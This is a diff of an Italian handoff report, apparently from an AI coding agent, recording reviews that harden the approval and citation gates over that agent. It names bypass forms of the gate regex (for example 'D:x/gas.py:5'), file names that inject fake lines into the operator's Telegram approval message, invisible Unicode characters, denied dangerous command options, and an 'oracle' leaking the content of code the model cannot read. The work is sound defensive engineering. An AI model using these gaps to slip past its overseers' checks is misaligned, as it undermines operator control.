-5. `tests/test_unit_notte.py:633` — il nuovo `test_riepilogo_telegram_esito_a_schermo` copre tre casi: inviato, `ok: False` e eccezione con messaggio segreto. In più `test_riepilogo_telegram_senza_configurazione` verifica la scritta «TELEGRAM_BOT_TOKEN mancante».
-   - Rischio: che il test non arrivi davvero al ramo da provare, perché `invia_notifica` viene importata dentro la funzione.
-   - Esito: **ok**. L'import avviene al momento della chiamata, quindi la sostituzione fatta nel test sull'attributo del modulo funziona. Ho rilanciato i test: 56 passed.
-   - Nota minore: nessun test verifica che il token finto "123:finto" non compaia a schermo. Il codice lo garantisce, ma il test non lo prova.
+**Cosa NON ho verificato**
 
-6. `reports/setup_notte.md:46` — la documentazione del controllo rapido con `grep "Riepilogo Telegram"`.
-   - Esito: **ok**. Il testo corrisponde a quello stampato.
+- Comportamento sul Mac (BSD): non riproducibile qui.
+- I comandi pericolosi (`date --se`, `file --compil`) li ho provati solo col controllo e non li ho eseguiti, per non ripetere il danno all'orologio della #272. Che vengano negati prima di partire basta per la sicurezza.
+- Il giro notturno reale: non riproducibile in sviluppo.
 
-**Cose che non ho verificato**
-- Il comportamento reale sotto launchd sul Mac: non ho controllato che lo stdout finisca davvero in `.gas_notte/launchd.log`, né che il messaggio arrivi dopo la correzione di `_carica_dotenv`. Non si può riprodurre in questo ambiente Linux.
-- Il caso EPIPE della R-267-1 l'ho ricavato leggendo il codice, non l'ho riprodotto.
-- I guardrail del motore (cap di 10 iterazioni, `_get_window`) non sono toccati da questo diff. Nel diff non c'è slicing della history né output dei tool simulati.
+Memoria aggiornata (riga #273) e committata da sola (8ee8d6a).
 
-**Memoria aggiornata**: ho aggiunto la riga #267 e una lezione in `/home/user/Gas/.claude/agents/memoria_revisore.md`, committata come `4dcc40d`.
-
-### Review #268 (fetta 5, ri-review: R-267-1 + V-6 seconda verifica esterna — commit `19b1a53`)
-
-## VERDETTO: APPROVATO
-
-Ri-review #268 del diff staged completo (PR #180). La riserva R-267-1 è chiusa e la correzione della V-6 tiene: ho riprodotto il test che la verifica e un mutation test conferma che il blocco serve davvero.
-
-**Parti del diff esaminate**
-
-1. `modules/notte/notte.py:307` — `_stampa_sicura` mette il `print(..., flush=True)` dentro un `try/except Exception`. La usano tutte e tre le stampe nuove di `_notifica_telegram`.
-   - Rischio: un errore nella stampa chiamata dal `finally` di `esegui_giro` prende il posto dell'exit code.
-   - Esito: **ok**. R-267-1 chiusa. Il nuovo `test_stampa_dell_esito_non_cambia_l_exit_code` fa fallire il print con un errore di pipe rotta (BrokenPipeError) e il giro chiude con 0. Che il test fallisca senza la correzione lo dichiara il coordinatore: io non l'ho rifatto.
-
-2. `modules/notte/notte.py:345` — il motivo stampato resta un testo fisso di `modules/telegram/bot.py` e dalle eccezioni esce solo il nome del tipo.
-   - Rischio: token, ID o testo non fidato a schermo.
-   - Esito: **ok**. Ora il test controlla anche che il token finto "123:finto" non compaia a schermo. I test di notte passano: 57 passed.
-
-3. `modules/telegram/bot.py:133` — `rendi_visibili(testo, a_capo=False)`: con questa opzione anche a-capo e tabulazioni diventano `<U+000A>`/`<U+0009>`. Il comportamento normale non cambia, quindi diff e pro/contro mantengono i loro a-capo.
-   - Rischio: rifiutare nomi di file legittimi, oppure cambiare il comportamento negli altri punti dove la funzione è usata.
-   - Esito: **ok**. Ho provato `gas.py`, `città/è.py`, `modules/x.py` e un nome NFD con accento combinante (`e` + U+0301): nessuno viene alterato. Viene alterato solo il nome con la tabulazione, com'è giusto.
-
-4. `modules/telegram/bot.py:172` — nel messaggio di firma, il nome chiesto e il file reale passano da `a_capo=False`.
-   - Rischio: un nome che aggiunge righe finte al messaggio, tipo «DIFF REALE…» o «ID approvazione».
-   - Esito: **ok**. Il test T82n (secondo controllo) verifica che il nome resti su una riga e che «ID approvazione:» compaia una sola volta.
-
-5. `gas.py:1612` — `_diff_unificato` rende visibili gli a-capo nel nome usato nelle intestazioni `a/…` e `b/…`.
-   - Rischio: un percorso risolto pulito solo in apparenza, per esempio un collegamento simbolico (symlink) che punta a un nome con a-capo, quando il controllo al punto 6 guarda solo `rel`.
-   - Esito: **ok**. Il percorso risolto passa da qui e anche da `_file_reale` al punto 4, quindi è coperto due volte. Rendere visibile due volte è innocuo: `<U+000A>` contiene solo caratteri visibili.
-
-6. `gas.py:1659` — `_prepara_firma_codice` nega la firma se `rel` contiene caratteri che andrebbero resi visibili. Il controllo avviene prima della risoluzione del percorso e dentro il `try`, che in caso di errore nega (fail-closed).
-   - Esito: **ok**. Ho fatto un mutation test (`if False:` al posto del controllo): il kernel dà 745 PASS e 1 FAIL, e fallisce proprio T82n, perché la richiesta finisce in coda di approvazione invece di essere negata. Ho poi ripristinato gas.py e verificato che non ha modifiche non staged. Suite completa del kernel: 746 PASS, 0 FAIL.
-
-**Cose che non ho verificato**
-- Come Telegram mostra davvero `<U+000A>` nel client mobile: non si può provare senza il bot reale.
-- La suite pytest completa da 947 test non l'ho rilanciata. Ho rilanciato solo notte (57) e kernel (746/0), cioè i test che toccano il diff.
-- Il comportamento sotto launchd sul Mac resta non verificato, come nella #267.
-
-Nel diff non c'è slicing della history, non c'è output dei tool simulato e il limite di 10 iterazioni non è toccato.
-
-**Memoria del revisore**: ho aggiunto le righe #267 (commit `4dcc40d`) e #268 (commit `af95f6b`) in `/home/user/Gas/.claude/agents/memoria_revisore.md`.
-
-## §4b VERDETTI ORIGINALI #264 E #265 (fuori dal §4, dichiarato)
-
-Testi originali integrali, conservati per trasparenza. Stanno FUORI dal §4 perché contengono esempi di regex in forma `path:riga` (file inesistenti) che il gate B legge come citazioni: dentro il §4 il gate resta rosso anche coi riemessi accanto. NB: la regola nuova di `.claude/commands/fine-task.md` dice «accanto all'originale nel §4»; qui non è applicabile alla lettera → da precisare (vedi §7). Il verdetto #264 originale cita la riga 44 di check_verdetto.py, oggi 46. Unica differenza di forma: la prima riga «## VERDETTO: …» è resa in grassetto per non aprire un blocco verdetto del gate.
-
-#### Review #264 ORIGINALE (fetta 3, prima review — BOCCIATO, non committato)
-
-**VERDETTO (originale):** BOCCIATO
-
-**Motivo del blocco (macchina di controllo, il gate B si indebolisce in alcuni casi).**
-
-- `scripts/check_verdetto.py:44`: il lookbehind `(?<![\\\w:])` impedisce che un match **parta** subito dopo `\`, una lettera o `:`. Però il motore regex riparte più avanti, dentro lo stesso token, dopo un `/`, un `.` o un `-`, perché questi caratteri non sono nel lookbehind. Ho confrontato vecchio e nuovo regex sulle stesse stringhe:
-
-| input | prima della fix | dopo la fix |
-|---|---|---|
-| `D:x/gas.py:5` | `x/gas.py` → «file non trovato a HEAD» → **rifiutata** | `gas.py:5` → **accettata** |
-| `C:\x\a.gas.py:4` | `a.gas.py` → rifiutata | `gas.py:4` → accettata |
-| `C:\x\y/gas.py:4` | `y/gas.py` → rifiutata | `gas.py:4` → accettata |
-| `C:\x\modules/telegram/bot.py:4` | `modules/telegram/bot.py` | `telegram/bot.py`, risolta per suffisso tramite `scripts/check_verdetto.py:187` |
-
-  Il caso V-2 segnalato (`C:\x\gas.py:4`) ora è chiuso. Però si aprono forme miste che prima il gate rifiutava. Una fix al gate che lo rende più permissivo anche su un solo input è un blocco.
-- **Fix proposta (una riga)**: mettere nel lookbehind l'intera classe di caratteri del token, cioè `(?<![\\\w:./\-])`. L'ho provata sugli stessi casi: tutte le forme miste qui sopra danno nessun match. Le citazioni legittime restano: `` `gas.py:4` ``, `(modules/a.py:7)`, `**b.md:1**`, `gas.py:59-71`, `x.gas.py:3`. Anche `../gas.py:4` e `/abs/gas.py:4` restano catturate e vengono rifiutate da `_resolve_path` come prima. Va aggiunto a `tests/test_unit_handoff_check.py:401` un caso che fallisce con la fix attuale, almeno `D:x/gas.py:5` e `C:\x\a.gas.py:4` (deve dare `[]`).
-
-**Elementi esaminati**
-- `scripts/check_verdetto.py:44`: regex delle citazioni. Rischio: citazioni legittime perse o forme nuove accettate. **Blocco**, descritto sopra.
-- `tests/test_unit_handoff_check.py:393-408`: due test nuovi, verdi (303 passed su gate e handoff_check). Coprono solo `C:\x\…` e `D:gas.py`, non le forme miste. **Riserva**: è proprio il buco del blocco.
-- `.claude/agents/revisore.md:59-61`: la frase sulle citazioni di contesto ora è intera, il significato non cambia. **Ok.**
-- `.claude/commands/fine-task.md:243`: regola F-verdetto-ritoccato. Mai ritoccare il verdetto: si chiede al revisore di riemetterlo e lo si dichiara accanto all'originale. È coerente con `reports/stato_progetto.md:161` e rende la procedura più severa. **Ok.**
-- `.gitignore:8`: la riga `.gas_history.json.*` copre i file `.tmp.<pid>` e `.corrupt.<ts>` scritti a `gas.py:832` e `gas.py:845`. `.gas_history.json` resta ignorato e viene forzato con force-add come prima. **Ok.**
-- `modules/notte/notte.py:17-18` e `modules/notte/notte.py:149-150`: solo a capo. La concatenazione implicita della f-string dà la stessa stringa. **Ok.**
-- `modules/telegram/bot.py:128` e `modules/telegram/bot.py:139-142`: R-263-1 chiusa per NBSP, U+3000, i selettori FE00–FE0F ed E0100–E01EF e i riempitivi Hangul (verificato a mano). Nel test `tests/test_unit_gate.py:515` ho controllato che i caratteri letterali FE0F e U+3164 sono davvero nel sorgente. **Riserva R-264-2 (BASSA)**: restano invisibili U+034F (combining grapheme joiner, categoria Mn) e U+2800 (braille vuoto, So). Effetto collaterale accettato: il read-back mostra `❤<U+FE0F>` sulle emoji, è rumore e non un problema di sicurezza.
-
-**Rischio escluso**: non ho rilanciato la suite completa (945) né la sonda del kernel (743/0). Ho eseguito solo `tests/test_unit_gate.py` e `tests/test_unit_handoff_check.py`, perché la fetta non tocca `gas.py`. Non ho nemmeno verificato `check_verdetto.py` su un handoff reale: l'ho provato solo sulla regex isolata e sui test.
-
-Riga contatore #264 e lezione (un lookbehind deve contenere tutta la classe del token) aggiunte a `/home/user/Gas/.claude/agents/memoria_revisore.md` e committate con `scripts/commit_memoria_revisore.sh`. Lo script non ha stampato nulla, quindi non ho una conferma diretta che il commit sia andato a buon fine. Dopo la fix serve una nuova review.
-
-File rilevanti: `/home/user/Gas/scripts/check_verdetto.py`, `/home/user/Gas/tests/test_unit_handoff_check.py`, `/home/user/Gas/modules/telegram/bot.py`.
-
-#### Review #265 ORIGINALE (fetta 3, ri-review, commit `0480996`)
-
-**VERDETTO (originale):** APPROVATO
-
-Ri-review #265, dopo la bocciatura #264. Le due cose che avevo chiesto sono state fatte: il gate B non accetta più le forme miste e i caratteri invisibili mancanti ora vengono mostrati.
-
-**Elementi esaminati**
-- `scripts/check_verdetto.py:46`: ora il lookbehind contiene tutti i caratteri che possono comparire in un percorso, cioè `(?<![\\\w:./\-])`. Così il regex non può più ripartire a metà di un percorso. Ho controllato il rischio che si perdano citazioni legittime confrontando vecchio e nuovo regex su testi veri:
-  - in `reports/handoff.md` le citazioni trovate sono 14 sia prima sia dopo;
-  - in `.claude/agents/memoria_revisore.md` passano da 389 a 386, e le 3 perse sono proprio le forme d'attacco che avevo scritto io nella #264.
-  
-  Il gate è più severo di prima e non ha perso nulla di legittimo. **Ok.**
-- `tests/test_unit_handoff_check.py:401`: il test controlla che le 4 forme miste non vengano catturate (`D:x/gas.py:5`, `C:\x\a.gas.py:4`, `C:\x\y/gas.py:4`, `C:\x\modules/telegram/bot.py:4`). Controlla anche che le forme legittime restino catturate: `gas.py:59-71`, `x.gas.py:3`, `../gas.py:4`, le citazioni dentro backtick o parentesi e quelle in grassetto. **Ok.**
-- `modules/telegram/bot.py:128`: U+034F (un carattere di unione invisibile) e U+2800 (braille vuoto) sono aggiunti a `_INVISIBILI_EXTRA`. L'ho verificato a mano: escono come `<U+034F>` e `<U+2800>`. Con questo R-264-2 è chiusa. **Ok.**
-- `tests/test_unit_gate.py:521`: il test copre i due caratteri nuovi. **Ok.**
-- Le altre modifiche della fetta sono le stesse che avevo già giudicato ok nella #264: `.claude/agents/revisore.md`, `.claude/commands/fine-task.md`, `.gitignore`, `modules/notte/notte.py`.
-
-**Rischio escluso**: non ho rilanciato la suite completa (945 passed secondo l'agente) né la sonda del kernel. Ho eseguito solo `tests/test_unit_gate.py` e `tests/test_unit_handoff_check.py` (303 passed) e il confronto sul corpus reale. Non ho fatto girare `check_verdetto.py` sull'handoff finale della sessione, perché quell'handoff non esiste ancora.
-
-Riga contatore #265 aggiunta a `/home/user/Gas/.claude/agents/memoria_revisore.md` e committata (31517ed). Resta da fare, a carico dell'agente: creare il marcatore con `bash scripts/segna_review_ok.sh` sul diff staged attuale.
+File rilevanti:
+- /home/user/Gas/gas.py
+- /home/user/Gas/tests/test_unit_kernel.py
+- /home/user/Gas/.claude/agents/memoria_revisore.md
 
 ## §5 DELTA TEST DEL MOTORE
 
-- pytest: 874 passed (primo giro della sessione, già con i 9 test dotenv della prima versione) → **945 passed** (`945 passed in 112.59s`).
-- Suite kernel (`python3 tests/test_unit_kernel.py`): prima della sessione `=== RIEPILOGO: 715 PASS, 0 FAIL ===` → dopo:
+- Suite kernel: prima (main `6e93b10`) `=== RIEPILOGO: 746 PASS, 0 FAIL ===` → dopo:
 
 ```
-=== RIEPILOGO: 743 PASS, 0 FAIL ===
+=== RIEPILOGO: 760 PASS, 0 FAIL ===
 ```
 
-Dopo la fetta 4 (commit `4ad0d46`): `=== RIEPILOGO: 744 PASS, 0 FAIL ===`; pytest `945 passed in 113.21s`.
-
-Dopo la fetta 5 (commit `19b1a53`): `=== RIEPILOGO: 746 PASS, 0 FAIL ===`; pytest `947 passed in 111.05s`.
+- pytest: `947 passed in 108.24s` (prima 947: i test nuovi del gate sostituiscono attese esistenti).
 
 Nessun FAIL fuori scope.
 
 ## §6 STATO CI
 
-`gh run list -L 3`: CI NON VERIFICATA via `gh` (nel container `gh` non è autenticato). Lettura con lo strumento GitHub collegato (check run della PR #180):
-
-- Sul push di `0480996`: `handoff-check` failure (run 38143041291, atteso: conteneva l'handoff della sessione precedente).
-- Sul push di `0f97ba7` (fine-task): `handoff-check` success e `unit-suite` success (run 38143334144); `verifica-bot` **failure** (check run 114482390915, finding MEDIA V-1: test dotenv non in CI → corretto in `4ad0d46`).
+`gh run list -L 3`: CI NON VERIFICATA via `gh` (nel container `gh` non è autenticato). Strumento GitHub collegato: la PR #181 è appena stata aperta sul push di `2e3e110`; esito non ancora letto alla scrittura.
 
 Mappatura commit→run:
-- `0480996`: run 38143041291. `faf1d1e`, `5764c4e`, `c6a2998`, `477ff0c`, `1ee779b`, `3e031f2`, `755c5a1`, `31517ed`: nessuna run su questo SHA (pushati insieme a `0480996`).
-- `0f97ba7`: run 38143334144 (CI) + verifica-bot.
-- `e74e2fe`, `4ad0d46`: nessuna run su questo SHA (pushati insieme a `55a341d`).
-- `55a341d` (fine-task): run 38144207393 — `unit-suite` success, `handoff-check` success (dalla review del bot); `verifica-bot` **neutral** (APPROVATO CON RISERVE senza finding ALTA/MEDIA; PR sulla macchina del bot → decide l'operatore).
-- `4dcc40d`, `af95f6b`, `19b1a53` e il commit di fine-task: run non ancora disponibile alla scrittura dell'handoff.
+- `2e3e110` (testa del primo push, insieme a `bd75789`, `4f71953`, `bb981ed`, `5dc9779`, `95b6b63`, `8ee8d6a`): run non ancora disponibile alla scrittura dell'handoff; i commit intermedi non hanno una run propria.
+- Commit di fine-task: run non ancora disponibile alla scrittura dell'handoff.
 
 ## §7 RISERVE APERTE
 
-- **R-260-3** (BASSA, doc): sul VPS un `.env` vecchio accanto a gas.py ora riempie le variabili mancanti in `.env.prod`. Tracciata in `reports/stato_progetto.md`.
-- **V-1 bot su `55a341d`** (BASSA): per i file di livello 2 il modello riceve messaggi diversi («identico», «impossibile preparare», «troppo grande») senza che l'operatore veda nulla: un piccolo oracolo sul contenuto del codice che non può leggere.
-- **V-2 bot su `55a341d`** (BASSA): `rendi_visibili` resta una lista; mancano ad es. U+180B–U+180F (selettori mongoli). Meglio una regola per classe (Default_Ignorable).
-- **V-7/V-8 seconda verifica esterna #180** (COSMETICA/BASSA): `export<TAB>` nel `.env` scartato; test voice_stt/voice_tts non in CI (preesistente).
-- R-267-1 e V-6 seconda verifica esterna: CHIUSE.
-- **V-3 verifica esterna #180** (BASSA, processo): originali #264/#265 in §4b, non validati dal gate; regola fine-task da precisare.
-- **V-5 verifica esterna #180** (COSMETICA): il lookbehind scarta anche citazioni attaccate a `:`.
-- **Limiti dichiarati 1A** (riserve 4-5 della #262; hard link ora negati): lettura del codice vietata (livello 2 utile solo su file piccoli/nuovi, script, config), Windows fuori dal modello di minaccia, hard link preesistenti non coperti. In `reports/design_cancello.md` §5b.
-- R-260-1, R-260-2, R-263-1, R-264-2: CHIUSE in sessione.
-- **Regola F-verdetto-ritoccato da precisare** (BASSA, processo): «riemesso accanto all'originale nel §4» non funziona quando l'originale contiene finte citazioni (il gate resta rosso); in questa sessione l'originale è in §4b. Precisare `.claude/commands/fine-task.md` (passa dal revisore).
+- **R-273-1** (BASSA): `file`/`wc`/`date` con elenco di opzioni vietate (grep/diff ad allowlist): allineare.
+- **R-273-2** (BASSA): varianti BSD (Mac) non provate.
+- Dal secondo passaggio claude.ai su #180 (DEFERITE, una PR per scopo): finta riga `+++ b/altro-file` nel diff della firma; `rendi_visibili` a elenco (U+180B); gate B non vede più una citazione finta attaccata a «vedi:».
+- Falsi positivi accettati: `grep -r`, `diff -r`, `grep -P`/`--include`, `uniq -f N`, `date --r=` negati.
